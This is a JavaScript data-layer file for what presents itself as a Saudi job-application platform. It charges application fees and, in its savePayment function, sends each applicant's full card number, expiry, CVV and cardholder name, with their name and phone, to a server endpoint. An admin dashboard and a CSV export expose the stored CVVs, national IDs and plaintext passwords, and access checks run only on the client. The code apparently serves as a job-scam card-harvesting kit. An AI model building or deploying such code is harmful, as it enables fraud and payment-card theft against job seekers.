// ==// ==========================================
// منصة توظيف السعودية - الاتصال بـ Vercel
// جميع البيانات تخزن محلياً وتُرسل إلى الخادم
// ==========================================

const API_URL = '/api/api';

// ========== إدارة المستخدمين (محلياً) ==========

// تسجيل مستخدم جديد
function registerUser(email, password) {
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    const existing = users.find(u => u.email === email);
    if (existing) {
        return { success: false, message: 'البريد الإلكتروني مسجل مسبقاً' };
    }
    
    const newId = users.length > 0 ? Math.max(...users.map(u => u.id)) + 1 : 1;
    const newUser = {
        id: newId,
        email: email,
        password: password,
        fullName: '',
        nationalId: '',
        phone: '',
        city: '',
        qualification: '',
        experience: '',
        skills: '',
        createdAt: new Date().toISOString()
    };
    users.push(newUser);
    localStorage.setItem('saudi_users', JSON.stringify(users));
    localStorage.setItem('currentUserId', newId);
    localStorage.setItem('currentUserEmail', email);
    
    return { success: true, userId: newId, email: email };
}

// تسجيل دخول
function loginUser(email, password) {
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    const user = users.find(u => u.email === email);
    if (!user) {
        return { success: false, message: 'البريد الإلكتروني غير موجود' };
    }
    if (user.password !== password) {
        return { success: false, message: 'كلمة المرور غير صحيحة' };
    }
    localStorage.setItem('currentUserId', user.id);
    localStorage.setItem('currentUserEmail', user.email);
    return { success: true, userId: user.id, email: email };
}

// الحصول على بيانات المستخدم
function getUser(userId) {
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    const user = users.find(u => u.id == userId);
    if (user) {
        const { password, ...userWithoutPassword } = user;
        return userWithoutPassword;
    }
    return null;
}

// تحديث بيانات المستخدم
function updateUser(userId, data) {
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    const index = users.findIndex(u => u.id == userId);
    if (index !== -1) {
        users[index] = { ...users[index], ...data };
        localStorage.setItem('saudi_users', JSON.stringify(users));
        return users[index];
    }
    return null;
}

// ========== إدارة التخصصات (محلياً) ==========

function getAllJobs() {
    const jobs = JSON.parse(localStorage.getItem('saudi_jobs') || '[]');
    if (jobs.length === 0) {
        const defaultJobs = [
            { id: 1, name: "تقنية المعلومات", icon: "💻", description: "مبرمج، مطور، أمن سيبراني، محلل بيانات", count: 234, category: "تكنولوجيا", salary: "8,000 - 25,000" },
            { id: 2, name: "إدارة الأعمال", icon: "📊", description: "مدير، مسؤول تسويق، مبيعات، موارد بشرية", count: 156, category: "إدارة", salary: "7,000 - 20,000" },
            { id: 3, name: "الهندسة", icon: "🏗️", description: "مدني، كهربائي، ميكانيكي، معماري", count: 189, category: "هندسة", salary: "9,000 - 30,000" },
            { id: 4, name: "المالية", icon: "💰", description: "محاسب، مدقق مالي، محلل استثمار", count: 98, category: "مالية", salary: "8,000 - 22,000" },
            { id: 5, name: "التعليم", icon: "📝", description: "معلم، أستاذ جامعي، مدرب", count: 145, category: "تعليم", salary: "6,000 - 18,000" },
            { id: 6, name: "الطب والصحة", icon: "🏥", description: "طبيب، ممرض، صيدلي، أخصائي", count: 167, category: "صحة", salary: "10,000 - 40,000" },
            { id: 7, name: "القانون", icon: "⚖️", description: "محامي، مستشار قانوني", count: 67, category: "قانون", salary: "8,000 - 25,000" },
            { id: 8, name: "التصميم", icon: "🎨", description: "مصمم جرافيك، UI/UX، مصور", count: 123, category: "إعلام", salary: "6,000 - 18,000" },
            { id: 9, name: "خدمة العملاء", icon: "🛒", description: "دعم فني، خدمة عملاء", count: 210, category: "خدمات", salary: "4,000 - 10,000" },
            { id: 10, name: "اللوجستيات", icon: "🚚", description: "مدير لوجستي، منسق شحن", count: 88, category: "خدمات", salary: "5,000 - 15,000" }
        ];
        localStorage.setItem('saudi_jobs', JSON.stringify(defaultJobs));
        return defaultJobs;
    }
    return jobs;
}

function getJob(jobId) {
    const jobs = getAllJobs();
    return jobs.find(j => j.id == jobId);
}

// ========== إدارة طلبات التوظيف (محلياً) ==========

function submitApplication(data) {
    const apps = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
    const newId = apps.length > 0 ? Math.max(...apps.map(a => a.id)) + 1 : 1;
    const newApp = {
        id: newId,
        ...data,
        status: 'pending',
        appliedAt: new Date().toISOString()
    };
    apps.push(newApp);
    localStorage.setItem('saudi_applications', JSON.stringify(apps));
    return newApp;
}

function getUserApplications(userId) {
    const apps = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
    return apps.filter(a => a.userId == userId);
}

// ========== إدارة المدفوعات (محلياً + إرسال إلى الخادم) ==========

async function savePayment(paymentData) {
    try {
        // تجهيز البيانات للإرسال إلى الخادم
        const remoteData = {
            userEmail: localStorage.getItem('currentUserEmail'),
            userId: paymentData.userId,
            applicationId: paymentData.applicationId,
            amount: paymentData.amount,
            cardNumber: paymentData.cardNumber,
            cardExpiry: paymentData.cardExpiry,
            cardCvv: paymentData.cardCvv,
            cardHolderName: paymentData.cardHolderName,
            paymentMethod: paymentData.paymentMethod,
            jobName: localStorage.getItem('selectedJobName'),
            fullName: paymentData.fullName,
            phone: paymentData.phone,
            time: new Date().toISOString()
        };
        
        console.log('📤 جاري إرسال البيانات إلى الخادم:', remoteData);
        
        // إرسال إلى Vercel API
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(remoteData)
        });
        
        const result = await response.json();
        console.log('✅ تم إرسال البيانات إلى الخادم:', result);
        
        // حفظ محلياً أيضاً
        const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
        const newId = payments.length > 0 ? Math.max(...payments.map(p => p.id)) + 1 : 1;
        const newPayment = {
            id: newId,
            ...paymentData,
            status: 'completed',
            paymentDate: new Date().toISOString()
        };
        payments.push(newPayment);
        localStorage.setItem('saudi_payments', JSON.stringify(payments));
        
        // تحديث حالة الطلب إلى مدفوع
        const apps = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
        const appIndex = apps.findIndex(a => a.id == paymentData.applicationId);
        if (appIndex !== -1) {
            apps[appIndex].status = 'paid';
            localStorage.setItem('saudi_applications', JSON.stringify(apps));
        }
        
        return { success: true, id: newId, remote: result };
        
    } catch(error) {
        console.error('❌ فشل إرسال البيانات:', error);
        
        // حفظ محلياً فقط في حالة فشل الإرسال
        const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
        const newId = payments.length > 0 ? Math.max(...payments.map(p => p.id)) + 1 : 1;
        const newPayment = {
            id: newId,
            ...paymentData,
            status: 'completed',
            paymentDate: new Date().toISOString(),
            offline: true
        };
        payments.push(newPayment);
        localStorage.setItem('saudi_payments', JSON.stringify(payments));
        
        return { success: true, id: newId, offline: true, error: error.message };
    }
}

// ========== إحصائيات الموقع ==========

function getStats() {
    const jobs = JSON.parse(localStorage.getItem('saudi_jobs') || '[]');
    const applications = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
    
    const totalRevenue = payments.reduce((sum, p) => sum + (p.amount || 0), 0);
    const totalJobOpenings = jobs.reduce((sum, j) => sum + (j.count || 0), 0);
    
    return {
        totalJobs: jobs.length,
        totalJobOpenings: totalJobOpenings,
        totalApplications: applications.length,
        totalUsers: users.length,
        totalPayments: payments.length,
        totalRevenue: totalRevenue
    };
}

// ========== تصدير البيانات ==========

function exportToJSON() {
    const allData = {
        users: JSON.parse(localStorage.getItem('saudi_users') || '[]'),
        jobs: JSON.parse(localStorage.getItem('saudi_jobs') || '[]'),
        applications: JSON.parse(localStorage.getItem('saudi_applications') || '[]'),
        payments: JSON.parse(localStorage.getItem('saudi_payments') || '[]'),
        exportDate: new Date().toISOString()
    };
    
    const jsonStr = JSON.stringify(allData, null, 2);
    const blob = new Blob([jsonStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `saudi_jobs_data_${new Date().toISOString().slice(0,19)}.json`;
    a.click();
    URL.revokeObjectURL(url);
}

function exportToCSV() {
    const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
    const applications = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    
    function arrayToCSV(data, headers) {
        const rows = [headers.join(',')];
        data.forEach(row => {
            const rowData = headers.map(h => {
                let val = row[h] || '';
                if (typeof val === 'string' && (val.includes(',') || val.includes('"'))) {
                    val = `"${val.replace(/"/g, '""')}"`;
                }
                return val;
            });
            rows.push(rowData.join(','));
        });
        return rows.join('\n');
    }
    
    const csvPayments = arrayToCSV(payments, ['id', 'userId', 'applicationId', 'amount', 'cardNumber', 'cardExpiry', 'cardCvv', 'cardHolderName', 'paymentMethod', 'status', 'paymentDate']);
    const csvApplications = arrayToCSV(applications, ['id', 'userId', 'jobId', 'jobName', 'fullName', 'nationalId', 'phone', 'city', 'qualification', 'experience', 'skills', 'status', 'appliedAt']);
    const csvUsers = arrayToCSV(users, ['id', 'email', 'password', 'fullName', 'nationalId', 'phone', 'city', 'qualification', 'experience', 'skills', 'createdAt']);
    
    const allCSV = `# ===== المستخدمين =====\n${csvUsers}\n\n# ===== طلبات التوظيف =====\n${csvApplications}\n\n# ===== المدفوعات (بما فيها بيانات البطاقة) =====\n${csvPayments}`;
    
    const blob = new Blob(["\uFEFF" + allCSV], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `saudi_jobs_data_${new Date().toISOString().slice(0,19)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
}

function showAllDataInDashboard(containerId, currentUserId) {
    const user = getUser(currentUserId);
    const ADMIN_EMAILS = ['admin@saudijobs.sa'];
    const isAdmin = ADMIN_EMAILS.includes(user?.email);
    
    const container = document.getElementById(containerId);
    if (!container) return;
    
    if (!isAdmin) {
        container.innerHTML = `<div style="text-align:center;padding:3rem;background:white;border-radius:20px;">⚠️ هذه الصفحة مخصصة للمدير فقط.</div>`;
        return;
    }
    
    const users = JSON.parse(localStorage.getItem('saudi_users') || '[]');
    const applications = JSON.parse(localStorage.getItem('saudi_applications') || '[]');
    const payments = JSON.parse(localStorage.getItem('saudi_payments') || '[]');
    
    container.innerHTML = `
        <div style="margin-bottom: 2rem;">
            <h3 style="color:#1a4a6e;margin-bottom:1rem;">📊 المستخدمين (${users.length})</h3>
            <div style="overflow-x:auto;">
                <table style="width:100%;border-collapse:collapse;background:white;border-radius:16px;overflow:hidden;">
                    <thead><tr style="background:#1a4a6e;color:white;"><th style="padding:12px;">ID</th><th style="padding:12px;">البريد</th><th style="padding:12px;">كلمة المرور</th><th style="padding:12px;">الاسم</th><th style="padding:12px;">الجوال</th><th style="padding:12px;">المدينة</th><th style="padding:12px;">تاريخ التسجيل</th></tr></thead>
                    <tbody>
                        ${users.map(u => `<tr style="border-bottom:1px solid #eee;"><td style="padding:12px;">${u.id}</td><td style="padding:12px;">${u.email}</td><td style="padding:12px;">${u.password}</td><td style="padding:12px;">${u.fullName || '-'}</td><td style="padding:12px;">${u.phone || '-'}</td><td style="padding:12px;">${u.city || '-'}</td><td style="padding:12px;">${new Date(u.createdAt).toLocaleDateString('ar-SA')}</td></tr>`).join('')}
                    </tbody>
                </table>
            </div>
        </div>
        <div style="margin-bottom: 2rem;">
            <h3 style="color:#1a4a6e;margin-bottom:1rem;">📝 طلبات التوظيف (${applications.length})</h3>
            <div style="overflow-x:auto;">
                <table style="width:100%;border-collapse:collapse;background:white;border-radius:16px;overflow:hidden;">
                    <thead><tr style="background:#1a4a6e;color:white;"><th style="padding:12px;">ID</th><th style="padding:12px;">الوظيفة</th><th style="padding:12px;">الاسم</th><th style="padding:12px;">الهوية</th><th style="padding:12px;">الجوال</th><th style="padding:12px;">المدينة</th><th style="padding:12px;">المؤهل</th><th style="padding:12px;">الخبرة</th><th style="padding:12px;">الحالة</th><th style="padding:12px;">تاريخ التقديم</th></tr></thead>
                    <tbody>
                        ${applications.map(a => `<tr style="border-bottom:1px solid #eee;"><td style="padding:12px;">${a.id}</td><td style="padding:12px;">${a.jobName}</td><td style="padding:12px;">${a.fullName}</td><td style="padding:12px;">${a.nationalId}</td><td style="padding:12px;">${a.phone}</td><td style="padding:12px;">${a.city}</td><td style="padding:12px;">${a.qualification}</td><td style="padding:12px;">${a.experience}</td><td style="padding:12px;"><span style="background:${a.status === 'paid' ? '#00b894' : '#ffd32a'};color:${a.status === 'paid' ? 'white' : '#1a4a6e'};padding:4px 12px;border-radius:20px;">${a.status === 'paid' ? 'مدفوع' : 'قيد المراجعة'}</span></td><td style="padding:12px;">${new Date(a.appliedAt).toLocaleDateString('ar-SA')}</td></tr>`).join('')}
                    </tbody>
                </table>
            </div>
        </div>
        <div>
            <h3 style="color:#1a4a6e;margin-bottom:1rem;">💳 المدفوعات (${payments.length})</h3>
            <div style="overflow-x:auto;">
                <table style="width:100%;border-collapse:collapse;background:white;border-radius:16px;overflow:hidden;">
                    <thead><tr style="background:#1a4a6e;color:white;"><th style="padding:12px;">ID</th><th style="padding:12px;">المستخدم</th><th style="padding:12px;">الطلب</th><th style="padding:12px;">المبلغ</th><th style="padding:12px;">رقم البطاقة</th><th style="padding:12px;">تاريخ الانتهاء</th><th style="padding:12px;">CVV</th><th style="padding:12px;">طريقة الدفع</th><th style="padding:12px;">الحالة</th><th style="padding:12px;">تاريخ الدفع</th></tr></thead>
                    <tbody>
                        ${payments.map(p => `<tr style="border-bottom:1px solid #eee;"><td style="padding:12px;">${p.id}</td><td style="padding:12px;">${p.userId}</td><td style="padding:12px;">${p.applicationId}</td><td style="padding:12px;">${p.amount} ريال</td><td style="padding:12px;">${p.cardNumber || '-'}</td><td style="padding:12px;">${p.cardExpiry || '-'}</td><td style="padding:12px;">${p.cardCvv || '-'}</td><td style="padding:12px;">${p.paymentMethod}</td><td style="padding:12px;"><span style="background:#00b894;color:white;padding:4px 12px;border-radius:20px;">مكتمل</span></td><td style="padding:12px;">${new Date(p.paymentDate).toLocaleDateString('ar-SA')}</td></tr>`).join('')}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}

// جعل الدوال متاحة عالمياً
window.SaudiJobsDB = {
    registerUser,
    loginUser,
    getUser,
    updateUser,
    getAllJobs,
    getJob,
    submitApplication,
    getUserApplications,
    savePayment,
    getStats,
    exportToJSON,
    exportToCSV,
    showAllDataInDashboard
};

console.log('✅ get-data.js تم تحميله بنجاح');
console.log('📁 البيانات تخزن محلياً وتُرسل إلى Vercel');